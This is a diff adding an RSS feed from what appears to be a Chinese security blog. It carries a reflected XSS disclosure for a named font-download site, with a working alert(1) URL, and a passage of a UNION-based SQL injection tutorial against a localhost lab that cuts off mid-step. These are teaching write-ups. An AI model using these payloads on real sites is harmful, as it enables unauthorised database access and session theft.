@@ -1,0 +1,371 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>security on Kayleh's blog</title><link>https://Kayleh.com/tags/security/</link><description>Recent content in security on Kayleh's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Sun, 11 Apr 2021 02:26:29 +0800</lastBuildDate><atom:link href="https://Kayleh.com/tags/security/index.xml" rel="self" type="application/rss+xml"/><item><title>Reflected XSS Vulnerability in Font Download Website</title><link>https://Kayleh.com/post/reflected-xss-vulnerability-infont-download-website/</link><pubDate>Sun, 11 Apr 2021 02:26:29 +0800</pubDate><guid>https://Kayleh.com/post/reflected-xss-vulnerability-infont-download-website/</guid><description>&lt;h2 id="字体下载网站的反射xss漏洞">字体下载网站的反射XSS漏洞&lt;/h2>
+&lt;blockquote>
+&lt;p>URL:http://www.ztxz.org&lt;/p>
+&lt;/blockquote>
+&lt;p>搜索框输入：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="nx">alert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="err">/script&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>会出现弹窗，证明反射XSS的存在。&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;a class="link" href="http://www.ztxz.org/search/?key=%3Cscript%3Ealert%281%29%3C/script%3E" target="_blank" rel="noopener"
+>http://www.ztxz.org/search/?key=%3Cscript%3Ealert(1)%3C/script%3E&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>用户在请求某条URL地址的时候，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器，从而触发反射型XSS。例如，当用户进行搜索时，返回结果通常会包括用户原始的搜索内容，如果攻击者精心构造包含XSS恶意代码的链接，诱导用户点击并成功执行后，用户的信息就可以被窃取，甚至可以模拟用户进行一些操作。它的利用过程如图所示。&lt;/p>
+&lt;p>&lt;img src="https://cdn.kayleh.top/gh/kayleh/cdn4/Reflected-XSS-Vulnerability-in-Font-Download-Website/20190522105651307.png"
+loading="lazy"
+alt="在这里插入图片描述"
+>&lt;/p>
+&lt;p>反射型XSS不会永久存储用户的数据，仅发生在用户的一次访问过程之后。这个过程就像一次反射，因此得名反射型XSS。反射型XSS的触发条件比较苛刻，需要攻击者想方设法引导用户点击链接，但产生的危害不容忽视。&lt;/p>
+&lt;p>参考资料：https://www.bugbank.cn/q/article/598438535ecec4fe1c216740.html&lt;/p>
+&lt;p>&lt;a class="link" href="http://blog.csdn.net/binyao02123202/article/details/9041113" target="_blank" rel="noopener"
+>http://blog.csdn.net/binyao02123202/article/details/9041113&lt;/a>&lt;/p></description></item><item><title>SQL injection</title><link>https://Kayleh.com/post/sql-injection-vulnerability/</link><pubDate>Tue, 06 Apr 2021 09:48:59 +0800</pubDate><guid>https://Kayleh.com/post/sql-injection-vulnerability/</guid><description>&lt;h1 id="sql注入">SQL注入&lt;/h1>
+&lt;blockquote>
+&lt;p>&lt;a class="link" href="https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html" target="_blank" rel="noopener"
+>https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="常见的几种sql注入">常见的几种SQL注入&lt;/h2>
+&lt;blockquote>
+&lt;p>1.数字型
+2.字符型
+3.文本型
+4.搜索型(POST/GET)
+5.cookie注入
+6.SQL盲注
+7.编码注入
+8.宽字节注入&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="mysql报错注入基本流程">MySQL报错注入基本流程&lt;/h2>
+&lt;blockquote>
+&lt;p>1.判断sql注入
+2.数据库权限判断
+3.判断字段数
+4.查询库名
+5.查表名
+6.查字段
+7.查数据&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="1数字型">1.数字型&lt;/h3>
+&lt;p>1.判断sql注入&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>提交单引号&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sqls&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="s1">&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>and大法和or大法&lt;/p>
+&lt;p>在参数后面加上&lt;code>and 1 = 1&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sqls&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="err">可以查询&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sqls&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="err">查询错误&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以发现and 1=1 返回了数据，而and 1=2没有，这是由于1=1是一个为真的条件，前面的结果是true，true and true 所以没有任何问题，第二个 1=2 是个假条件， true and false还是false，所以并没有数据返回。&lt;/p>
+&lt;p>接下来看下or、or就是或者，两个都为假，才会为假，只要一个为真就为真，把语句后面的id改成一个不存在的，后面接上or 1=1，这样的话就成了 false or true，结果为true。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sqls&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">or&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>加法和减法&lt;/p>
+&lt;p>加法和减法的使用要区别是数字型还是字符型的注入、然后来区分了、可以看他后面的参数如果是数字、就一定是数字型、如果是一些字母的话就是字符型注入。&lt;/p>
+&lt;pre tabindex="0">&lt;code>select * from user where id=4 //数字型注入 sql 语句
+select * from user where username=’fendo’ //字符型注入 sql 语句
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>
+&lt;p>加法&lt;/p>
+&lt;p>我们在参数输入1+1，看看返回的数据是不是id等于2的结果，这里注意一下+号在SQL语句是有特效含义的，所以我们要对其进行url编码，最后也就是%2b。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="err">第二条数据&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>减法&lt;/p>
+&lt;p>减法是同样的道理，不过不需要对-号进行url编码了&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="err">第一条数据&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>数据库权限判断&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ord&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mid&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">114&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">解释&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">判断&lt;/span>&lt;span class="n">ROOT权限&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">返回正确存在&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">----------------------------------
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="err">或&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mysql&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">解释&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mysql&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="cm">/* 如果结果返回正常,说明具有读写权限。
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">and (select count(*) from mysql.user)&amp;gt;0 /* 返回错误，应该是管理员给数据库帐户降权了。
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>判断字段数&lt;/p>
+&lt;p>常用的两种猜解方式:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>用union联合查询：and 1=1 union select 1,2,3,4,5…… 或 union select null,null,null&amp;hellip;..&lt;/p>
+&lt;p>UNION SELECT 联合查询：可以用于一个或多个SELECT的结果集，但是他有一个条件，就是两个select查询语句的查询必须要有相同的列才可以执行，利用这个特性我们可以进行对比查询，也就是说当我们union select的列与它查询的列相同时，页面返回正常。在and后面加上1=1或1=2的作用后面会讲。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>例：&lt;/p>
+&lt;p>当字段为2时页面返回错误&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sqls&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sqls&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="err">正常查询&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sqls&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="err">错误&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-----
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="err">说明字段数就是&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="err">，输入的数大于或小于字段数时都会报错。使用&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">是一样的&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sqls&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>
+&lt;p>2.用order by 查询“order by * &amp;ndash; order by&lt;/p>
+&lt;p>order by查询：在sql语句中是对结果集的指定列进行排序，比如我们想让结果集按照第一列排序就是 order by 1 按照第二列排序 order by 2 依次类推，按照这个原理我们来判断他的字段数，如果我们按照他的第1列进行排序数据库会返回正常，但是当我们按照第100列排序，但是数据库中并不存在第100列，从而报错。 同union&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>这里有两个问题&lt;/strong>&lt;/p>
+&lt;p>&lt;strong>第一个&lt;/strong>：大部分程序只会调用数据库查询的第一条语句进行查询然后返回（我们这个也是），而通过联合查询出的数据中，我们想看到的数据是在第二条语句中，如果我们想看到我们想要的数据有两种方法，第一种是让第一条数据返回假，第二种是通过sql语句直接返回我们想要的数据。
+第一种：我们让第一个查询的结果始终为假&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sqls&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">null&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>第二种&lt;/strong>：通过limit语句，limit在mysql中是用来分页的，通过他可以从查询出来的数据中获取我们想要的数据&lt;/p>
+&lt;p>limit语法:&lt;/p>
+&lt;pre tabindex="0">&lt;code>LIMIT [offset] rows | rows OFFSET offset
+&lt;/code>&lt;/pre>&lt;p>LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目，初始记录行的偏移量是 0(而不是 1)。&lt;/p>
+&lt;p>列:&lt;/p>
+&lt;pre tabindex="0">&lt;code>SELECT * FROM table LIMIT 5,10; // 检索记录行 6-15
+&lt;/code>&lt;/pre>&lt;p>在地址后面加入以下代码&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 union select null,null,null limit 1,1
+&lt;/code>&lt;/pre>&lt;p>第二个：哪个列中的数据是在页面中显示出来的，有一些列中的数据只是用于后台程序处理，并不会在前台显示，所以我们需要判断哪个字段我们可以看到。所以，我们要通过数字代替NULL进行查询，来确定哪些字段会在页面中显示。这也就是为什么我们不一开始就用数字而用null，因为union select 不仅要求列的数量相同 同时数据类型也要相似。&lt;/p>
+&lt;p>&lt;img src="https://cdn.kayleh.top/gh/kayleh/cdn4/SQL%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/584a947239ae725aab3ee529f701eb7d.jpg"
+loading="lazy"
+alt="img"
+>&lt;/p>
+&lt;ul>
+&lt;li>查询库名&lt;/li>
+&lt;/ul>
+&lt;p>版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。&lt;/p>
+&lt;p>通过下面的语句可以判断数据库版本&lt;/p>
+&lt;pre tabindex="0">&lt;code>and ord(mid(version(),1,1))&amp;gt;51
+&lt;/code>&lt;/pre>&lt;p>解释1： 确认数据库版本， 51是ASCII码3 正确则&amp;gt;4.0 错误则&amp;lt;4.0，当版本大于3.0时才能使用union方法；
+解释2：ord()是mysql的函数用于获取二进制码；
+解释3：mid()是mysql的函数用于截位操作；
+解释4：version()是mysql的函数用于获取当前数据库的版本；&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 and ord(mid(version(),1,1))&amp;gt;51
+&lt;/code>&lt;/pre>&lt;p>&lt;strong>方法一:&lt;/strong>&lt;/p>
+&lt;p>可以直接使用mysql自带函数database()查询得到数据库名：&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 union select 1,database(),3 limit 1,1
+&lt;/code>&lt;/pre>&lt;p>&lt;strong>方法二:&lt;/strong>&lt;/p>
+&lt;p>使用以下语句语句得到所有的数据库名&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 union select null,schema_name,null from information_schema.schemata
+&lt;/code>&lt;/pre>&lt;p>还可以获取第一个库名：&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 union select null,schema_name,null from information_schema.schemata limit 0,1
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://cdn.kayleh.top/gh/kayleh/cdn4/SQL%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/86d1024ab776770ef0a2f6e559ec83df.jpg"
+loading="lazy"
+alt="img"
+>&lt;/p>
+&lt;p>并没有显示数据库名而显示的是第一条语句查询出来的结果。在union前面加上and 1=2，就能显示出来了。&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 and 1=2 union select null,schema_name,null from information_schema.schemata limit 0,1
+&lt;/code>&lt;/pre>&lt;p>获取第二个库名：&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 and 1=2 union select null,schema_name,null from information_schema.schemata limit 0,2
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>查表名&lt;/li>
+&lt;/ul>
+&lt;p>在MySQL中，表名存放在information_schema数据库下tables表table_name字段中、查表名我们主要用到的是TABLES表。&lt;/p>
+&lt;p>方法一:&lt;/p>
+&lt;p>用group_concat它可以返回查询的所有结果，因为我们需要通过命名判断该我们需要的敏感数据。&lt;/p>
+&lt;p>group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。要返回哪些列，由函数参数(就是字段名)决定。分组必须有个标准，就是根据group by指定的列进行分组。&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&amp;#39;test&amp;#39;
+&lt;/code>&lt;/pre>&lt;p>方法二:&lt;/p>
+&lt;p>使用下面的语句也是可以查出来的&lt;/p>
